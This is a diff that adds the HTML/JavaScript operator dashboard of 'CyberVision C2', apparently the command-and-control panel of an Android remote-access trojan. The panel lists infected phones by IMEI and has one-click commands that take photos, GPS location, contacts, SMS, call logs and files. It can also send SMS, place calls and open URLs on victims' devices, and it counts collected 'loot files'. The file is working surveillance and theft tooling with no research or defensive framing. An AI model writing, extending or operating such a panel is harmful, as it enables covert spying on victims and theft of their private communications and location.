@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberVision C2 Dashboard</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d1117; --panel: #161b22; --border: #30363d;
+      --accent: #58a6ff; --green: #3fb950; --yellow: #d29922;
+      --red: #f85149; --text: #c9d1d9; --muted: #8b949e;
+    }
+    body { background: var(--bg); color: var(--text); font-family: 'SF Mono', 'Fira Code', monospace; font-size: 13px; }
+    header {
+      background: var(--panel); border-bottom: 1px solid var(--border);
+      padding: 14px 24px; display: flex; align-items: center; gap: 12px;
+    }
+    header h1 { font-size: 16px; font-weight: 600; color: var(--accent); letter-spacing: 0.5px; }
+    .badge { background: var(--green); color: #000; font-size: 10px; padding: 2px 7px; border-radius: 10px; font-weight: 700; }
+    .badge.offline { background: var(--red); }
+    .layout { display: grid; grid-template-columns: 320px 1fr; height: calc(100vh - 53px); }
+    .sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
+    .sidebar-header { padding: 12px 16px; border-bottom: 1px solid var(--border); font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: space-between; align-items: center; }
+    .client-list { overflow-y: auto; flex: 1; }
+    .client-item {
+      padding: 12px 16px; border-bottom: 1px solid var(--border); cursor: pointer;
+      transition: background 0.15s; display: flex; align-items: center; gap: 10px;
+    }
+    .client-item:hover { background: #1c2128; }
+    .client-item.active { background: #1f2937; border-left: 3px solid var(--accent); }
+    .client-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--green); flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .client-info { flex: 1; min-width: 0; }
+    .client-name { font-weight: 600; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .client-sub { color: var(--muted); font-size: 11px; margin-top: 2px; }
+    .main { display: flex; flex-direction: column; overflow: hidden; }
+    .toolbar {
+      background: var(--panel); border-bottom: 1px solid var(--border);
+      padding: 10px 20px; display: flex; gap: 8px; flex-wrap: wrap; align-items: center;
+    }
+    .btn {
+      background: #21262d; border: 1px solid var(--border); color: var(--text);
+      padding: 5px 12px; border-radius: 6px; cursor: pointer; font-size: 12px;
+      font-family: inherit; transition: all 0.15s; display: flex; align-items: center; gap: 5px;
+    }
+    .btn:hover { background: #30363d; border-color: var(--accent); color: var(--accent); }
+    .btn.primary { background: var(--accent); color: #000; border-color: var(--accent); font-weight: 600; }
+    .btn.primary:hover { background: #79c0ff; }
+    .btn.danger { border-color: var(--red); color: var(--red); }
+    .btn.danger:hover { background: #2d1b1b; }
+    .content { flex: 1; display: grid; grid-template-rows: 1fr 200px; overflow: hidden; }
+    .output-area { overflow-y: auto; padding: 16px 20px; font-size: 12px; line-height: 1.7; }
+    .log-entry { margin-bottom: 4px; }
+    .log-entry .ts { color: var(--muted); margin-right: 8px; }
+    .log-entry.info .msg { color: var(--text); }
+    .log-entry.success .msg { color: var(--green); }
+    .log-entry.error .msg { color: var(--red); }
+    .log-entry.loot .msg { color: var(--yellow); }
+    .log-entry.cmd .msg { color: var(--accent); }
+    .input-area {
+      border-top: 1px solid var(--border); background: var(--panel);
+      padding: 12px 20px; display: flex; flex-direction: column; gap: 8px;
+    }
+    .input-row { display: flex; gap: 8px; }
+    .cmd-input {
+      flex: 1; background: var(--bg); border: 1px solid var(--border); color: var(--text);
+      padding: 8px 12px; border-radius: 6px; font-family: inherit; font-size: 12px;
+      outline: none; transition: border-color 0.15s;
+    }
+    .cmd-input:focus { border-color: var(--accent); }
+    .modal-overlay {
+      display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+      z-index: 100; align-items: center; justify-content: center;
+    }
+    .modal-overlay.show { display: flex; }
+    .modal {
+      background: var(--panel); border: 1px solid var(--border); border-radius: 10px;
+      padding: 24px; width: 420px; max-width: 95vw;
+    }
+    .modal h3 { font-size: 14px; margin-bottom: 16px; color: var(--accent); }
+    .form-group { margin-bottom: 12px; }
+    .form-group label { display: block; font-size: 11px; color: var(--muted); margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+    .form-group input, .form-group select, .form-group textarea {
+      width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--text);
+      padding: 8px 10px; border-radius: 6px; font-family: inherit; font-size: 12px; outline: none;
+    }
+    .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: var(--accent); }
+    .form-group textarea { resize: vertical; min-height: 60px; }
+    .modal-actions { display: flex; gap: 8px; justify-content: flex-end; margin-top: 16px; }
+    .no-client { display: flex; align-items: center; justify-content: center; height: 100%; color: var(--muted); flex-direction: column; gap: 12px; }
+    .no-client svg { opacity: 0.3; }
+    .status-bar { padding: 4px 20px; background: var(--panel); border-top: 1px solid var(--border); font-size: 11px; color: var(--muted); display: flex; gap: 20px; }
+    .status-bar span { display: flex; align-items: center; gap: 4px; }
+    .pulse { animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+    select option { background: var(--panel); }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>⚡ CyberVision C2 Dashboard</h1>
+  <span class="badge" id="server-badge">ONLINE</span>
+  <span style="margin-left:auto;color:var(--muted);font-size:11px;" id="server-addr">Connecting...</span>
+</header>
+
+<div class="layout">
+  <!-- Sidebar: client list -->
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <span>Active Sessions</span>
+      <span id="client-count" style="color:var(--green);font-weight:700;">0</span>
+    </div>
+    <div class="client-list" id="client-list">
+      <div style="padding:20px;color:var(--muted);font-size:11px;text-align:center;">
+        Waiting for connections...
+      </div>
+    </div>
+  </div>
+
+  <!-- Main panel -->
+  <div class="main" id="main-panel">
+    <div class="no-client" id="no-client-msg">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+        <rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/>
+      </svg>
+      <span>Select a client to interact</span>
+    </div>
+
+    <div id="client-panel" style="display:none;flex-direction:column;height:100%;">
+      <div class="toolbar" id="action-toolbar">
+        <span style="color:var(--muted);font-size:11px;margin-right:4px;" id="active-label">—</span>
+        <button class="btn" onclick="sendAction('info')">📱 Info</button>
+        <button class="btn" onclick="sendAction('advinfo')">🔬 Adv Info</button>
+        <button class="btn" onclick="sendAction('photo')">📷 Photo</button>
+        <button class="btn" onclick="sendAction('gps')">📍 GPS</button>
+        <button class="btn" onclick="sendAction('contacts')">👥 Contacts</button>
+        <button class="btn" onclick="sendAction('sms')">💬 SMS</button>
+        <button class="btn" onclick="sendAction('call_log')">📞 Call Log</button>
+        <button class="btn" onclick="openModal('dir')">📂 Dir</button>
+        <button class="btn" onclick="openModal('download')">⬇️ Download</button>
+        <button class="btn" onclick="openModal('toast')">💬 Toast</button>
+        <button class="btn" onclick="openModal('vibrate')">📳 Vibrate</button>
+        <button class="btn" onclick="openModal('call')">📲 Call</button>
+        <button class="btn" onclick="openModal('send_sms')">✉️ Send SMS</button>
+        <button class="btn" onclick="openModal('url')">🌐 URL</button>
+      </div>
+
+      <div class="content">
+        <div class="output-area" id="output-area">
+          <div class="log-entry info"><span class="ts">--:--:--</span><span class="msg">Session output will appear here...</span></div>
+        </div>
+        <div class="input-area">
+          <div class="input-row">
+            <input class="cmd-input" id="raw-cmd" placeholder="Raw command (e.g. dir /sdcard)" onkeydown="if(event.key==='Enter')sendRaw()">
+            <button class="btn primary" onclick="sendRaw()">▶ Send</button>
+            <button class="btn" onclick="clearOutput()">🗑 Clear</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="status-bar">
+  <span><span class="pulse" style="color:var(--green);">●</span> C2 Server: <span id="status-host">localhost:9999</span></span>
+  <span>Sessions: <span id="status-sessions">0</span></span>
+  <span>Loot files: <span id="status-loot">0</span></span>
+  <span id="status-time"></span>
+</div>
+
+<!-- Modals for actions requiring input -->
+<div class="modal-overlay" id="modal-overlay" onclick="if(event.target===this)closeModal()">
+  <div class="modal">
+    <h3 id="modal-title">Action</h3>
+    <div id="modal-body"></div>
+    <div class="modal-actions">
+      <button class="btn" onclick="closeModal()">Cancel</button>
+      <button class="btn primary" onclick="submitModal()">Execute</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  const API = '';  // same origin
+  let selectedClient = null;
+  let pollInterval = null;
+
+  // ── Polling ────────────────────────────────────────────────────────────────
+  function startPolling() {
+    fetchClients();
+    pollInterval = setInterval(fetchClients, 2000);
+    setInterval(() => {
+      document.getElementById('status-time').textContent =
+        new Date().toLocaleTimeString();
+    }, 1000);
+  }
+
+  async function fetchClients() {
+    try {
+      const r = await fetch('/api/clients');
+      const data = await r.json();
+      renderClients(data.clients);
+      document.getElementById('status-sessions').textContent = data.clients.length;
+      document.getElementById('status-loot').textContent = data.loot_count || 0;
+      document.getElementById('server-addr').textContent =
+        `${data.host}:${data.c2_port} (C2)  |  ${data.host}:${data.web_port} (Web)`;
+    } catch(e) {
+      document.getElementById('server-badge').textContent = 'OFFLINE';
+      document.getElementById('server-badge').className = 'badge offline';
+    }
+  }
+
+  function renderClients(clients) {
+    const list = document.getElementById('client-list');
+    document.getElementById('client-count').textContent = clients.length;
+    if (!clients.length) {
+      list.innerHTML = '<div style="padding:20px;color:var(--muted);font-size:11px;text-align:center;">Waiting for connections...</div>';
+      return;
+    }
+    list.innerHTML = clients.map((c, i) => `
+      <div class="client-item ${selectedClient === c.imei ? 'active' : ''}"
+           onclick="selectClient('${c.imei}', '${c.model}', '${c.ip}')">
+        <div class="client-dot"></div>
+        <div class="client-info">
+          <div class="client-name">${c.imei}</div>
+          <div class="client-sub">${c.model} · ${c.ip}</div>
+        </div>
+        <div style="color:var(--muted);font-size:10px;">#${i}</div>
+      </div>
+    `).join('');
+  }
+
+  function selectClient(imei, model, ip) {
+    selectedClient = imei;
+    document.getElementById('no-client-msg').style.display = 'none';
+    const panel = document.getElementById('client-panel');
+    panel.style.display = 'flex';
+    document.getElementById('active-label').textContent = `▸ ${imei}`;
+    addLog('info', `Selected client: ${imei} (${model} · ${ip})`);
+    fetchClients();
+  }
+
+  // ── Actions ────────────────────────────────────────────────────────────────
+  async function sendAction(action, args = {}) {
+    if (!selectedClient) { addLog('error', 'No client selected.'); return; }
+    addLog('cmd', `→ ${action} ${JSON.stringify(args)}`);
+    try {
+      const r = await fetch('/api/command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ imei: selectedClient, action, args })
+      });
+      const data = await r.json();
+      if (data.ok) addLog('success', `✓ Command sent on ch${data.channel}`);
+      else addLog('error', `✗ ${data.error}`);
+    } catch(e) {
+      addLog('error', `Request failed: ${e.message}`);
+    }
+  }
+
+  async function sendRaw() {
+    const input = document.getElementById('raw-cmd');
+    const line = input.value.trim();
+    if (!line) return;
+    const parts = line.split(/\s+/);
+    const action = parts[0];
+    const arg = parts.slice(1).join(' ');
+    await sendAction(action, { arg });
+    input.value = '';
+  }
+
+  // ── Modal system ───────────────────────────────────────────────────────────
+  const MODAL_CONFIGS = {
+    dir:      { title: '📂 List Directory', fields: [{ name:'path', label:'Directory Path', placeholder:'/sdcard', type:'text' }] },
+    download: { title: '⬇️ Download File',  fields: [{ name:'path', label:'File Path on Device', placeholder:'/sdcard/DCIM/photo.jpg', type:'text' }] },
+    toast:    { title: '💬 Show Toast',     fields: [{ name:'msg', label:'Message to Display', placeholder:'Hello from CyberVision!', type:'text' }] },
+    vibrate:  { title: '📳 Vibrate Device', fields: [{ name:'ms', label:'Duration (milliseconds)', placeholder:'2000', type:'number' }] },
+    call:     { title: '📲 Make a Call',    fields: [{ name:'number', label:'Phone Number', placeholder:'+972501234567', type:'tel' }] },
+    send_sms: { title: '✉️ Send SMS',       fields: [
+      { name:'number', label:'Recipient Phone Number', placeholder:'+972501234567', type:'tel' },
+      { name:'body',   label:'Message Body', placeholder:'Type your message...', type:'textarea' }
+    ]},
+    url:      { title: '🌐 Open URL',       fields: [{ name:'url', label:'URL', placeholder:'https://example.com', type:'url' }] },
+  };
+
+  let currentModal = null;
+
+  function openModal(action) {
+    const cfg = MODAL_CONFIGS[action];
+    if (!cfg) { sendAction(action); return; }
+    currentModal = action;
+    document.getElementById('modal-title').textContent = cfg.title;
+    document.getElementById('modal-body').innerHTML = cfg.fields.map(f => `
+      <div class="form-group">
+        <label>${f.label}</label>
+        ${f.type === 'textarea'
+          ? `<textarea id="mf-${f.name}" placeholder="${f.placeholder}"></textarea>`
+          : `<input type="${f.type}" id="mf-${f.name}" placeholder="${f.placeholder}">`
+        }
+      </div>
+    `).join('');
+    document.getElementById('modal-overlay').classList.add('show');
+    // Focus first field
+    setTimeout(() => {
+      const first = document.querySelector('#modal-body input, #modal-body textarea');
+      if (first) first.focus();
+    }, 50);
+  }
+
+  function closeModal() {
+    document.getElementById('modal-overlay').classList.remove('show');
+    currentModal = null;
+  }
+
+  function submitModal() {
+    if (!currentModal) return;
+    const cfg = MODAL_CONFIGS[currentModal];
+    const args = {};
+    for (const f of cfg.fields) {
+      const el = document.getElementById(`mf-${f.name}`);
+      args[f.name] = el ? el.value.trim() : '';
+    }
+    sendAction(currentModal, args);
+    closeModal();
+  }
+
+  // ── Output log ─────────────────────────────────────────────────────────────
+  function addLog(type, msg) {
+    const area = document.getElementById('output-area');
+    const ts = new Date().toLocaleTimeString();
+    const div = document.createElement('div');
+    div.className = `log-entry ${type}`;
+    div.innerHTML = `<span class="ts">${ts}</span><span class="msg">${escHtml(msg)}</span>`;
+    area.appendChild(div);
+    area.scrollTop = area.scrollHeight;
+  }
+
+  function clearOutput() {
+    document.getElementById('output-area').innerHTML = '';
+  }
+
+  function escHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  // ── Keyboard shortcut: Enter in modal ─────────────────────────────────────
+  document.addEventListener('keydown', e => {
+    if (e.key === 'Escape') closeModal();
+    if (e.key === 'Enter' && currentModal && e.target.tagName !== 'TEXTAREA') submitModal();
+  });
+
+  startPolling();
+</script>
+</body>
+</html>
